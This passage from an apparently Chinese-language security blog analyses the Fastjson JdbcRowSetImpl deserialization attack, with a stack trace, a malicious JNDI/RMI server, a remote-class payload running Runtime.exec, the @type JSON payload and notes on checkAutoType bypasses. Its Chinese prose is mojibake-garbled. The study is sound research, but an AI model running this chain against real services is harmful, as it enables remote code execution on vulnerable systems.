</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>exec:348, Runtime (java.lang)
</span></span><span style="display:flex;"><span>&lt;init&gt;:19, badClassName (com.reus09)
</span></span><span style="display:flex;"><span>newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:423, Constructor (java.lang.reflect)
</span></span><span style="display:flex;"><span>newInstance:442, Class (java.lang)
</span></span><span style="display:flex;"><span>getObjectFactoryFromReference:174, NamingManager (javax.naming.spi)
</span></span><span style="display:flex;"><span>getObjectInstance:330, NamingManager (javax.naming.spi)
</span></span><span style="display:flex;"><span>decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
</span></span><span style="display:flex;"><span>lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
</span></span><span style="display:flex;"><span>lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
</span></span><span style="display:flex;"><span>lookup:417, InitialContext (javax.naming)
</span></span><span style="display:flex;"><span>connect:624, JdbcRowSetImpl (com.sun.rowset)
</span></span><span style="display:flex;"><span>setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
</span></span><span style="display:flex;"><span>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:498, Method (java.lang.reflect)
</span></span><span style="display:flex;"><span>setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:137, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>parse:128, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>main:123, FastJsonTest (com.reus09)
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…ˆçœ‹ä¸€ä¸‹ <code>setAutoCommit()</code> æ–¹æ³•ï¼Œåœ¨ <code>conn</code> ä¸ºç©ºæ—¶ï¼Œå°†ä¼šè°ƒç”¨ <code>connect()</code> æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012170224510.png" alt="image-20221012170224510"  />
</p>
<p>ç„¶ååœ¨<code>connect</code>æ–¹æ³•é‡Œé¢è°ƒç”¨äº† <code>javax.naming.InitialContext#lookup()</code> æ–¹æ³•ï¼Œå‚æ•°ä»æˆå‘˜å˜é‡ <code>dataSource</code> ä¸­è·å–ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012170333164.png" alt="image-20221012170333164"  />
</p>
<ul>
<li>é€šè¿‡å‡½æ•°æ ˆçš„å˜åŒ–ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œåœ¨<code>FastJson</code>è§£æå‡½æ•°<code>parse</code>å‡½æ•°ä½œç”¨çš„æ—¶å€™ï¼Œé€šè¿‡åå°„ç»™ç±»çš„å…ƒç´ èµ‹å€¼çš„æ—¶å€™å¼•èµ·çš„å‘½ä»¤æ‰§è¡Œã€‚åœ¨<code>FieldDeserialize#setValue</code>æ–¹æ³•ï¼Œç„¶åæ‰§è¡Œ<code>setAutoCommit()</code>æ–¹æ³•ï¼Œè¿›è€Œå®ç°ååºåˆ—åŒ–ã€‚</li>
</ul>
<p>ç¼–å†™ä¸€ä¸ª<code>JNDI</code>æœåŠ¡</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.NamingException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Reference;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.AlreadyBoundException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.RemoteException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.registry.LocateRegistry;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.rmi.registry.Registry;
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName JDNIServer
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/12 18:09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> JDNIServer {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> RemoteException, NamingException, AlreadyBoundException {
</span></span><span style="display:flex;"><span>        Registry registry = LocateRegistry.<span style="color:#007f7f">createRegistry</span>(<span style="color:#ff0;font-weight:bold">1099</span>);
</span></span><span style="display:flex;"><span>        Reference reference = <span style="color:#fff;font-weight:bold">new</span> Reference(<span style="color:#0ff;font-weight:bold">&#34;com.reus09.badClassName&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;com.reus09.badClassName&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;http://127.0.0.1:8000/&#34;</span>);
</span></span><span style="display:flex;"><span>        ReferenceWrapper referenceWrapper = <span style="color:#fff;font-weight:bold">new</span> ReferenceWrapper(reference);
</span></span><span style="display:flex;"><span>        registry.<span style="color:#007f7f">bind</span>(<span style="color:#0ff;font-weight:bold">&#34;Exploit&#34;</span>,referenceWrapper);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Context;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.Name;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.naming.spi.ObjectFactory;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Hashtable;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> badClassName <span style="color:#fff;font-weight:bold">implements</span> ObjectFactory {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> badClassName() <span style="color:#fff;font-weight:bold">throws</span> IOException {
</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>Payload</code>éƒ¨åˆ†</p>
<ul>
<li>
<p>JSONæ ¼å¼</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;dataSourceName&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;rmi://127.0.0.1:1099/Exploit&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;autoCommit&#34;</span>:<span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>ä»£ç </p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// è§£å†³javaç‰ˆæœ¬è¿‡é«˜çš„é—®é¢˜ï¼Œé»˜è®¤ä»¥ä¸‹çš„å…ƒç´ éƒ½ä¸ºfalse 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.cosnaming.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;JdbcRowSetImpl  é“¾çš„åˆ©ç”¨&#34;</span>);
</span></span><span style="display:flex;"><span>String payload2 = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/Exploit\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span>;
</span></span><span style="display:flex;"><span>JSON.<span style="color:#007f7f">parse</span>(payload2);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012184649052.png" alt="image-20221012184649052"  />
</p>
</li>
</ul>
<h2 id="autotypeä¸checkautotype">AutoTypeä¸checkAutoType<a hidden class="anchor" aria-hidden="true" href="#autotypeä¸checkautotype">#</a></h2>
<p>Fastjsonæä¾›äº†autotypeåŠŸèƒ½,å…è®¸ç”¨æˆ·åœ¨ååºåˆ—åŒ–æ•°æ®ä¸­é€šè¿‡<code>â€œ@typeâ€</code>æŒ‡å®šååºåˆ—åŒ–çš„Classç±»å‹ã€‚</p>
<p>ç®€å•çš„æ¥è¯´å°±æ˜¯ï¼šå½“ä¸€ä¸ªç±»ä¸­åŒ…å«äº†ä¸€ä¸ªæ¥å£ï¼ˆæˆ–æŠ½è±¡ç±»ï¼‰çš„æ—¶å€™ï¼Œåœ¨æ­£å¸¸ååºåˆ—åŒ–ä¸­ï¼Œä¼šå°†å­ç±»å‹æŠ¹å»ï¼Œåªä¿ç•™æ¥å£ï¼ˆæŠ½è±¡ç±»ï¼‰çš„ç±»å‹ï¼Œä½¿å¾—ååºåˆ—åŒ–æ—¶æ— æ³•æ‹¿åˆ°åŸå§‹ç±»å‹ã€‚<code>FastJson</code>é€šè¿‡ä½¿ç”¨<code>autotype</code>æ¥å¯¹æŒ‡å®šçš„<code>@type</code>å®ç°çš„æ¥å£åŒæ ·è¿›è¡Œæ­£å¸¸ååºåˆ—åŒ–ã€‚</p>
<p>å…·ä½“çš„è¯ï¼Œçœ‹<a href="https://www.cnpanda.net/sec/1183.html">pandaå¸ˆå‚…</a>å¯¹<code>AutoType</code>èµ·åˆ°çš„ä½œç”¨è¿›è¡Œäº†ç®€å•çš„ä»‹ç»ã€‚</p>
<p>checkAutoTypeæ˜¯ FastJson åœ¨ 1.2.25 ä»¥åŠä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œä¸ºäº†é˜²æ­¢ autoType è¿™ä¸€æœºåˆ¶å¸¦æ¥çš„ å®‰å…¨éšæ‚£ï¼Œå¢åŠ çš„æ£€æµ‹é˜²å¾¡æœºåˆ¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹äº @type å±æ€§è¿›è¡Œç™½åå•+é»‘åå•çš„é™åˆ¶æœºåˆ¶ã€‚</p>
<p>æ—©æœŸç‰ˆæœ¬çš„checkAutoTypeå­˜åœ¨ä¸€äº›æ¯”è¾ƒä½çº§çš„ç»•è¿‡æ–¹æ³•ï¼Œå¦‚åŠ ä¸ŠLå¼€å¤´;ç»“å°¾ã€åŒå†™LLç»•è¿‡ ç­‰ï¼Œç›´åˆ°1.2.48ç‰ˆæœ¬åï¼ŒcheckAutoType å˜å¾—æˆç†Ÿï¼Œé»‘åå•ä¹Ÿé€æ¸å®Œå–„ã€‚</p>
<p>å…¶å…·ä½“é€»è¾‘ï¼Œå¯ä»¥ç”¨ã€ŠHow i use json deserializationã€‹è®®é¢˜çš„ä¸€å¼ å›¾ç‰‡æ¦‚æ‹¬:</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image2976131683.png" alt="4.png"  />
</p>
<p>checkAutoTypeé¦–å…ˆä¼šå¯¹ä¼ å…¥çš„typeNameè¿›è¡Œ3é¡¹æ£€æµ‹:</p>
<ul>
<li>æ˜¯å¦æ˜¯ç™½åå•ä¸­çš„ç±»</li>
<li>æ˜¯å¦åœ¨ååºåˆ—åŒ–cacheä¸­(åœ¨mappingsåˆ—è¡¨)</li>
<li>ç±»æœ‰JSONTypeæ³¨è§£(å¦‚:fastjson.annotation.JSONType)</li>
</ul>
<p>å¦‚æœæ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šç›´æ¥returnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½ å…¥cache</p>
<p>å¦‚æœæ²¡æœ‰æ»¡è¶³å…¶ä¸­çš„ä¸€ä¸ªæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šè¿›å…¥å¦ä¸€ä¸ªåˆ¤æ–­:</p>
<ul>
<li>ä¼ å…¥çš„typeNameæ˜¯å¦åœ¨é»‘åå•ä¸­</li>
